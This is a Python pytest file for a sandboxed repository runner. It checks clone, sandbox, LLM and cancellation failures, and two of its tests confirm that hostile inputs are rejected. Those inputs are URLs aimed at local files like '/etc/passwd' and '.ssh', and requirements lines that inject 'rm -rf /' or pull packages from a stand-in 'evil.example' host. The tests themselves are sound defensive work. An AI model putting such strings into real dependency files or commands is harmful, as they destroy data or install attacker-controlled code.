import json

import pytest

from paperharness.agent.fake import FakeLLM
from paperharness.contracts.run import ExecResult, RunRequest, RunState
from paperharness.harness.runner import INSTALL_COMMAND, HarnessRunner, git_clone
from paperharness.harness.store import RunStore
from paperharness.sandbox.fake import FakeSandboxSession


def make_runner(tmp_path, results=None, artifact_path=None, cloner=None, factory=None):
    store = RunStore(tmp_path)

    def default_factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text("", encoding="utf-8")
        return FakeSandboxSession(
            results, artifact_path=artifact_path, workspace=run_dir / "workspace"
        )

    def default_cloner(request, run_dir):
        return request.revision or "fake-commit"

    runner = HarnessRunner(
        store=store,
        llm=FakeLLM(),
        sandbox_factory=factory or default_factory,
        cloner=cloner or default_cloner,
    )
    return runner, store


def test_runner_success_verifies_artifact(tmp_path):
    runner, store = make_runner(tmp_path, artifact_path="out.txt")
    request = RunRequest(
        repo_url="https://github.com/a/b",
        command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.verified is True
    assert result.outcome == "succeeded"
    assert store.read_status(run_id)["state"] == RunState.SUCCEEDED.value


def test_runner_failure_is_not_verified(tmp_path):
    install_ok = ExecResult(
        exit_code=0,
        timed_out=False,
        duration_ms=5,
        stdout_path="logs/i.log",
        stderr_path="logs/i.err",
    )
    failing = ExecResult(
        exit_code=1,
        timed_out=False,
        duration_ms=5,
        stdout_path="logs/t.log",
        stderr_path="logs/t.err",
        stderr_tail="boom",
    )
    runner, store = make_runner(tmp_path, results=[install_ok, failing])
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.verified is False
    assert result.outcome == "failed"
    assert store.read_status(run_id)["state"] == RunState.FAILED.value


def test_clone_failure_marks_failed(tmp_path):
    def broken_cloner(request, run_dir):
        raise RuntimeError("git clone boom")

    runner, store = make_runner(tmp_path, cloner=broken_cloner)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "clone_failed"
    assert store.read_status(run_id)["failure_category"] == "clone_failed"


def test_sandbox_unavailable_marks_service_interrupted(tmp_path):
    from paperharness.sandbox.base import SandboxUnavailableError

    def dead_factory(request, run_dir):
        raise SandboxUnavailableError("no docker engine")

    runner, store = make_runner(tmp_path, factory=dead_factory)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "service_interrupted"


@pytest.mark.parametrize(
    "bad_url",
    [
        "C:/Users/xxx/.ssh",
        "/etc/passwd",
        "file:///e:/java/LuminaLit",
        "ssh://git@h/o/r",
        "https://arxiv.org/html/2512.11143v1",  # 明知不是 Git 仓库的 host：防线御纵深
    ],
)
def test_git_clone_rejects_non_https_sources(tmp_path, bad_url):
    # model_construct 绕过 schema 校验，模拟直接喂 request.json 的路径
    request = RunRequest.model_construct(repo_url=bad_url)
    with pytest.raises(ValueError, match="invalid repo_url"):
        git_clone(request, tmp_path)
    # 没碰 workspace：不允许把本地目录搬进挂载区
    assert not (tmp_path / "workspace").exists()


def test_cleanup_failures_are_recorded(tmp_path):
    store = RunStore(tmp_path)

    def leaky_factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text("", encoding="utf-8")
        session = FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )
        session.cleanup_errors = ["container remove failed: boom", "network remove failed: boom"]
        return session

    runner = HarnessRunner(
        store=store,
        llm=FakeLLM(),
        sandbox_factory=leaky_factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    # 结果不受影响，但失败必须可见
    assert result.outcome == "succeeded"
    events = store.read_events(run_id)
    cleanup_events = [e for e in events if e.kind == "cleanup_failed"]
    assert len(cleanup_events) == 1
    assert cleanup_events[0].data["count"] == 2
    assert cleanup_events[0].state == RunState.SUCCEEDED
    environment = json.loads(store.read_text(run_id, "environment.json"))
    assert environment["cleanup_failures"] == 2
    assert "cleanup_failures=2" in store.read_text(run_id, "report.md")


def test_cleanup_success_leaves_no_trace(tmp_path):
    runner, store = make_runner(tmp_path, artifact_path="out.txt")
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "succeeded"
    assert all(e.kind != "cleanup_failed" for e in store.read_events(run_id))
    environment = json.loads(store.read_text(run_id, "environment.json"))
    assert "cleanup_failures" not in environment


def test_llm_unavailable_marks_failed(tmp_path):
    class DeadLLM(FakeLLM):
        def propose_run_plan(self, request):
            raise RuntimeError("llm gateway down")

    store = RunStore(tmp_path)

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        return FakeSandboxSession(workspace=run_dir / "workspace")

    runner = HarnessRunner(
        store=store, llm=DeadLLM(), sandbox_factory=factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "llm_unavailable"
    assert store.read_status(run_id)["failure_category"] == "llm_unavailable"


def test_cancel_during_run_marks_cancelled(tmp_path):
    store = RunStore(tmp_path)

    def cancelling_cloner(request, run_dir):
        # 在 clone 阶段请求取消：置事件 + 关闭 session
        assert runner.abort(run_dir.name) is True

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        return FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )

    runner = HarnessRunner(
        store=store, llm=FakeLLM(), sandbox_factory=factory,
        cloner=cancelling_cloner,
    )
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    assert result.outcome == "cancelled"
    assert result.verified is False
    assert store.read_status(run_id)["state"] == RunState.CANCELLED.value
    assert store.read_result(run_id).outcome == "cancelled"
    final_events = [e for e in store.read_events(run_id) if e.kind == "final"]
    assert final_events and final_events[-1].state == RunState.CANCELLED


def test_abort_unknown_run_returns_false(tmp_path):
    store = RunStore(tmp_path)
    runner = HarnessRunner(
        store=store, llm=FakeLLM(),
        sandbox_factory=lambda request, run_dir: FakeSandboxSession(),
        cloner=lambda request, run_dir: "fake-commit",
    )
    assert runner.abort("never-started") is False


# ---------------------------------------------------------- requirements 校验


def make_runner_with_requirements(tmp_path, content, session_holder=None, session=None):
    """workspace 里塞指定内容的 requirements.txt，记录 session 供断言。"""
    store = RunStore(tmp_path)

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text(content, encoding="utf-8")
        sandbox = session or FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )
        if session_holder is not None:
            session_holder.append(sandbox)
        return sandbox

    runner = HarnessRunner(
        store=store,
        llm=FakeLLM(),
        sandbox_factory=factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    return runner, store


@pytest.mark.parametrize(
    "content",
    [
        "numpy; rm -rf /\n",
        "--index-url http://evil.example/simple\nnumpy==1.0\n",
        "-e git+https://github.com/evil/x#egg=x\n",
        "pkg @ https://evil.example/x.whl\n",
        "numpy \\\n; rm -rf /\n",
    ],
)
def test_malicious_requirements_rejected_before_pip(tmp_path, content):
    # 拒绝时零副作用：一个 pip 命令都不许跑到
    holder: list = []
    runner, store = make_runner_with_requirements(tmp_path, content, session_holder=holder)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    assert result.outcome == "failed"
    assert result.failure_category == "requirement_rejected"
    assert store.read_status(run_id)["state"] == RunState.FAILED.value
    assert holder[0].commands == []  # INSTALL_COMMAND 没执行
    rejected_events = [
        e for e in store.read_events(run_id) if e.kind == "install" and "rejected" in e.message
    ]
    assert rejected_events, "拒绝原因必须写进事件流"
    assert rejected_events[0].data["source"] == "requirements_file"


def test_requirements_with_comments_and_pins_passes(tmp_path):
    content = "# pinned\n\nnumpy==1.26.4  # security fix\nscipy>=1.11\n"
    holder: list = []
    runner, store = make_runner_with_requirements(tmp_path, content, session_holder=holder)
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    assert result.outcome == "succeeded"
    assert INSTALL_COMMAND in holder[0].commands


def test_install_network_restored_off_when_execute_raises(tmp_path):
    from paperharness.sandbox.base import SandboxClosedError

    class InstallDiesSession(FakeSandboxSession):
        def execute(self, command, timeout_seconds):
            if command == INSTALL_COMMAND:
                raise SandboxClosedError("session died mid-install")
            return super().execute(command, timeout_seconds)

    holder: list = []
    runner, store = make_runner_with_requirements(
        tmp_path, "numpy==1.0\n", session_holder=holder, session=InstallDiesSession()
    )
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    # 原始异常不被 finally 盖掉：仍按超时口径收敛
    assert result.failure_category == "timeout"
    # install 抛异常后网络必须回到断网，不许留在开态
    assert holder[0].network_state is False
